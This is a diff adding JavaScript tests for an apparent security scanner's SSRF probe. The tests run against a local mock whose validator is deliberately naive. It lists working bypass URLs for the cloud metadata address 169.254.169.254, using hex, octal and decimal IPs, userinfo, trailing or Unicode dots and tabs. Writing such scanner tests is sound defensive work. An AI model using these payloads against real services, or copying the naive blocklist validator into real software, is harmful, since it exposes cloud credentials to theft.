@@ -604,3 +604,280 @@ test('SSRF-40: schemeTapUrls and redirectorUrl build exact URLs', () => {
     'http://172.17.0.1:45678/redir/http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F'
   );
 });
+
+// --- SSRF via URL parser differentials (coverage row #469) -----------------
+// The mock below is a lab target with a VALIDATOR + FETCHER pair — the
+// exact differential the legs target:
+//   - validator: a naive literal-host blocklist. It extracts the host
+//     with a plain regex (^https?://([^/:?#@]+)) and blocks only exact
+//     literals (169.254.169.254, localhost, 127.0.0.1,
+//     metadata.google.internal). It does NOT normalize: hex/decimal/
+//     octal IPs, trailing dots, unicode dots, tabs and userinfo all
+//     pass it. A validator that normalizes (WHATWG parse + IP
+//     canonicalization) is NOT bypassed by these payloads — that is
+//     the honest limit, documented in ssrf.js and docs/scanner/ssrf.md.
+//   - fetcher: WHATWG `new URL()` + a metadata listing stub served iff
+//     the parsed hostname is 169.254.169.254. The listing satisfies
+//     fetchedMetadataMarker (two or more whole-line listing fields).
+// NOTE: the SSRF-1..9 tests above replace globalThis.fetch with stubs.
+// Every differential test below resets it to the real fetch first so
+// the mock server receives real HTTP requests.
+const CONTROL_469 = 'http://169.254.169.254/latest/meta-data/';
+const LISTING_469 = 'ami-id\nami-launch-index\nami-manifest-path\ninstance-id\ninstance-type\nlocal-ipv4\n';
+
+// Every payload the legs try. Each MUST parse to the metadata host
+// under WHATWG URL (verified empirically on Node 24) while evading
+// the mock validator's literal-host blocklist.
+const PAYLOADS_469 = {
+  'alt-ip': [
+    'http://0xA9FEA9FE/latest/meta-data/',
+    'http://0xA9.0xFE.0xA9.0xFE/latest/meta-data/',
+    'http://2852039166/latest/meta-data/',
+    'http://0251.0376.0251.0376/latest/meta-data/',
+  ],
+  userinfo: [
+    'http://trusted.example@169.254.169.254/latest/meta-data/',
+    'http://trusted.example:80@169.254.169.254/latest/meta-data/',
+  ],
+  'host-normalization': [
+    'http://169.254.169.254./latest/meta-data/',
+    'http://169。254。169。254/latest/meta-data/',
+    'http://169.254.169.254%E3%80%82/latest/meta-data/',
+  ],
+  'whitespace-trim': [
+    'http://169.254.169.254\t/latest/meta-data/',
+    'http://169.254\t.169.254/latest/meta-data/',
+  ],
+};
+
+function startMock469({ open = false, dead = false, flaky = false, extraBlocked = [] } = {}) {
+  const hits = [];
+  const blocked = new Set(
+    ['169.254.169.254', 'localhost', '127.0.0.1', 'metadata.google.internal']
+      .concat(extraBlocked.map((s) => String(s).toLowerCase()))
+  );
+  const perPayloadHits = new Map();
+  const server = http.createServer((req, res) => {
+    const u = new URL(req.url, 'http://127.0.0.1');
+    if (u.pathname !== '/fetch') {
+      res.writeHead(404);
+      res.end('not found');
+      return;
+    }
+    const raw = u.searchParams.get('url') ?? '';
+    hits.push(raw);
+    const count = (perPayloadHits.get(raw) || 0) + 1;
+    perPayloadHits.set(raw, count);
+    // Naive validator: plain-regex host[:port] extraction (it does not
+    // strip the port before the blocklist comparison), exact-literal
+    // blocklist. `trusted.example:80@...` therefore extracts as
+    // `trusted.example:80`, which is not the blocked literal
+    // `trusted.example` — the port-confusion differential.
+    const m = raw.match(/^https?:\/\/([^/?#@]+)/);
+    const host = m ? m[1].toLowerCase() : null;
+    if (!open && (!host || blocked.has(host))) {
+      res.writeHead(403, { 'Content-Type': 'text/plain' });
+      res.end('blocked: private host');
+      return;
+    }
+    // Fetcher: WHATWG parse; metadata listing iff the parsed host is internal.
+    let parsed;
+    try {
+      parsed = new URL(raw);
+    } catch {
+      res.writeHead(400);
+      res.end('invalid url');
+      return;
+    }
+    const internal = parsed.hostname === '169.254.169.254';
+    // Flaky mode: listing on the FIRST hit for a payload only, never on
+    // the repeat — the repeat gate must reject every family.
+    const showMarker = !dead && internal && (!flaky || count === 1);
+    if (showMarker) {
+      res.writeHead(200, { 'Content-Type': 'text/plain' });
+      res.end(LISTING_469);
+    } else {
+      res.writeHead(200, { 'Content-Type': 'text/plain' });
+      res.end(`fetched external host: ${parsed.hostname}`);
+    }
+  });
+  return new Promise((resolve) => {
+    server.listen(0, '127.0.0.1', () => {
+      resolve({ server, port: server.address().port, hits });
+    });
+  });
+}
+
+async function withMock469(opts, fn) {
+  const mock = await startMock469(opts);
+  try {
+    return await fn(mock);
+  } finally {
+    await new Promise((resolve) => mock.server.close(resolve));
+  }
+}
+
+const diffs469 = (findings) => findings.filter((f) => f.class === 'ssrf_parser_differential');
+
+test('SSRF-469-1: differential payloads all parse to the metadata host under WHATWG', () => {
+  for (const [family, list] of Object.entries(PAYLOADS_469)) {
+    assert.ok(list.length > 0, `${family} has payloads`);
+    for (const p of list) {
+      assert.equal(new URL(p).hostname, '169.254.169.254', `${family}: ${JSON.stringify(p)}`);
+    }
+  }
+});
+
+test('SSRF-469-2: alt-ip family confirms via hex (probe + repeat)', async () => {
+  globalThis.fetch = realFetch;
+  await withMock469({}, async ({ port, hits }) => {
+    const findings = await probeSsrf(`http://127.0.0.1:${port}/fetch`, ['url'], { allowWrite: true });
+    const found = diffs469(findings);
+    assert.equal(found.length, 1);
+    assert.equal(found[0].severity, 'high');
+    assert.equal(found[0].evidence.variant, 'alt-ip');
+    assert.equal(found[0].evidence.coverageRow, 469);
+    assert.ok(found[0].evidence.request.includes('0xA9FEA9FE'));
+    // Probe + repeat: the confirming payload was sent at least twice.
+    const hexHits = hits.filter((h) => h === PAYLOADS_469['alt-ip'][0]).length;
+    assert.ok(hexHits >= 2, `hex payload hit ${hexHits}x, expected >= 2`);
+  });
+});
+
+test('SSRF-469-3: alt-ip falls back to hex-quad when hex-single is blocked', async () => {
+  globalThis.fetch = realFetch;
+  await withMock469({ extraBlocked: ['0xa9fea9fe'] }, async ({ port, hits }) => {
+    const findings = await probeSsrf(`http://127.0.0.1:${port}/fetch`, ['url'], { allowWrite: true });
+    const found = diffs469(findings);
+    assert.equal(found.length, 1);
+    assert.equal(found[0].evidence.variant, 'alt-ip');
+    const quadHits = hits.filter((h) => h === PAYLOADS_469['alt-ip'][1]).length;
+    assert.ok(quadHits >= 2, `hex-quad payload hit ${quadHits}x, expected >= 2`);
+  });
+});
+
+// Validator-side host forms (what the mock's naive regex extracts) for
+// each family, used to block EARLIER families so a later family is the
+// one that confirms. The legs try families in order and stop at the
+// first confirming family (one finding per parameter), so a test for a
+// later family must neutralize every earlier family first.
+const ALT_IP_HOSTS_469 = ['0xa9fea9fe', '0xa9.0xfe.0xa9.0xfe', '2852039166', '0251.0376.0251.0376'];
+const USERINFO_HOSTS_469 = ['trusted.example', 'trusted.example:80'];
+const HOSTNORM_HOSTS_469 = ['169.254.169.254.', '169。254。169。254', '169.254.169.254%e3%80%82'];
+
+test('SSRF-469-4: userinfo family confirms via trusted.example@', async () => {
+  globalThis.fetch = realFetch;
+  await withMock469({ extraBlocked: ALT_IP_HOSTS_469 }, async ({ port, hits }) => {
+    const findings = await probeSsrf(`http://127.0.0.1:${port}/fetch`, ['url'], { allowWrite: true });
+    const found = diffs469(findings);
+    assert.equal(found.length, 1);
+    assert.equal(found[0].evidence.variant, 'userinfo');
+    const atHits = hits.filter((h) => h === PAYLOADS_469.userinfo[0]).length;
+    assert.ok(atHits >= 2, `userinfo payload hit ${atHits}x, expected >= 2`);
+  });
+});
+
+test('SSRF-469-5: userinfo falls back to :80@ when trusted.example is blocked', async () => {
+  globalThis.fetch = realFetch;
+  await withMock469({ extraBlocked: [...ALT_IP_HOSTS_469, 'trusted.example'] }, async ({ port, hits }) => {
+    const findings = await probeSsrf(`http://127.0.0.1:${port}/fetch`, ['url'], { allowWrite: true });
+    const found = diffs469(findings);
+    assert.equal(found.length, 1);
+    assert.equal(found[0].evidence.variant, 'userinfo');
+    const portHits = hits.filter((h) => h === PAYLOADS_469.userinfo[1]).length;
+    assert.ok(portHits >= 2, `:80@ payload hit ${portHits}x, expected >= 2`);
+  });
+});
+
+test('SSRF-469-6: host-normalization confirms via trailing dot', async () => {
+  globalThis.fetch = realFetch;
+  await withMock469({ extraBlocked: [...ALT_IP_HOSTS_469, ...USERINFO_HOSTS_469] }, async ({ port, hits }) => {
+    const findings = await probeSsrf(`http://127.0.0.1:${port}/fetch`, ['url'], { allowWrite: true });
+    const found = diffs469(findings);
+    assert.equal(found.length, 1);
+    assert.equal(found[0].evidence.variant, 'host-normalization');
+    const dotHits = hits.filter((h) => h === PAYLOADS_469['host-normalization'][0]).length;
+    assert.ok(dotHits >= 2, `trailing-dot payload hit ${dotHits}x, expected >= 2`);
+  });
+});
+
+test('SSRF-469-7: host-normalization falls back to U+3002 when trailing dot is blocked', async () => {
+  globalThis.fetch = realFetch;
+  await withMock469({ extraBlocked: [...ALT_IP_HOSTS_469, ...USERINFO_HOSTS_469, '169.254.169.254.'] }, async ({ port, hits }) => {
+    const findings = await probeSsrf(`http://127.0.0.1:${port}/fetch`, ['url'], { allowWrite: true });
+    const found = diffs469(findings);
+    assert.equal(found.length, 1);
+    assert.equal(found[0].evidence.variant, 'host-normalization');
+    const uniHits = hits.filter((h) => h === PAYLOADS_469['host-normalization'][1]).length;
+    assert.ok(uniHits >= 2, `U+3002 payload hit ${uniHits}x, expected >= 2`);
+  });
+});
+
+test('SSRF-469-8: whitespace-trim confirms via trailing tab', async () => {
+  globalThis.fetch = realFetch;
+  await withMock469({ extraBlocked: [...ALT_IP_HOSTS_469, ...USERINFO_HOSTS_469, ...HOSTNORM_HOSTS_469] }, async ({ port, hits }) => {
+    const findings = await probeSsrf(`http://127.0.0.1:${port}/fetch`, ['url'], { allowWrite: true });
+    const found = diffs469(findings);
+    assert.equal(found.length, 1);
+    assert.equal(found[0].evidence.variant, 'whitespace-trim');
+    const tabHits = hits.filter((h) => h === PAYLOADS_469['whitespace-trim'][0]).length;
+    assert.ok(tabHits >= 2, `trailing-tab payload hit ${tabHits}x, expected >= 2`);
+  });
+});
+
+test('SSRF-469-9: whitespace-trim falls back to mid-host tab when trailing tab is blocked', async () => {
+  globalThis.fetch = realFetch;
+  await withMock469({ extraBlocked: [...ALT_IP_HOSTS_469, ...USERINFO_HOSTS_469, ...HOSTNORM_HOSTS_469, '169.254.169.254\t'] }, async ({ port, hits }) => {
+    const findings = await probeSsrf(`http://127.0.0.1:${port}/fetch`, ['url'], { allowWrite: true });
+    const found = diffs469(findings);
+    assert.equal(found.length, 1);
+    assert.equal(found[0].evidence.variant, 'whitespace-trim');
+    const midHits = hits.filter((h) => h === PAYLOADS_469['whitespace-trim'][1]).length;
+    assert.ok(midHits >= 2, `mid-host-tab payload hit ${midHits}x, expected >= 2`);
+  });
+});
+
+test('SSRF-469-10: repeat gate — markers on first hit only never confirm', async () => {
+  globalThis.fetch = realFetch;
+  await withMock469({ flaky: true }, async ({ port }) => {
+    const findings = await probeSsrf(`http://127.0.0.1:${port}/fetch`, ['url'], { allowWrite: true });
+    assert.equal(diffs469(findings).length, 0, 'flaky single-hit markers must not confirm');
+  });
+});
+
+test('SSRF-469-11: lab gate — without allowWrite the differential legs send nothing', async () => {
+  globalThis.fetch = realFetch;
+  await withMock469({}, async ({ port, hits }) => {
+    const findings = await probeSsrf(`http://127.0.0.1:${port}/fetch`, ['url'], {});
+    assert.equal(diffs469(findings).length, 0);
+    // Without allowWrite no #469 payload may arrive. The merged probe's
+    // non-gated legs still send their own requests (plain metadata leg,
+    // #309 alternate-IP forms, #310 file://) — and the #309 forms share
+    // the alt-ip payloads, so this gate is checked on the families only
+    // #469 sends: userinfo, host-normalization, whitespace-trim.
+    const gated469 = [
+      ...PAYLOADS_469['userinfo'],
+      ...PAYLOADS_469['host-normalization'],
+      ...PAYLOADS_469['whitespace-trim'],
+    ];
+    assert.ok(hits.every((h) => !gated469.includes(h)), 'no differential payload without allowWrite');
+    assert.ok(hits.includes(CONTROL_469), 'plain metadata leg still sends its control');
+  });
+});
+
+test('SSRF-469-12: control already open — no differential finding (plain leg covers it)', async () => {
+  globalThis.fetch = realFetch;
+  await withMock469({ open: true }, async ({ port }) => {
+    const findings = await probeSsrf(`http://127.0.0.1:${port}/fetch`, ['url'], { allowWrite: true });
+    assert.equal(diffs469(findings).length, 0, 'open validator => differential is meaningless');
+    assert.ok(findings.some((f) => f.class === 'ssrf'), 'plain metadata leg still fires');
+  });
+});
+
+test('SSRF-469-13: dead fetcher — no markers anywhere, no findings', async () => {
+  globalThis.fetch = realFetch;
+  await withMock469({ dead: true }, async ({ port }) => {
+    const findings = await probeSsrf(`http://127.0.0.1:${port}/fetch`, ['url'], { allowWrite: true });
+    assert.equal(diffs469(findings).length, 0);
+  });
+});
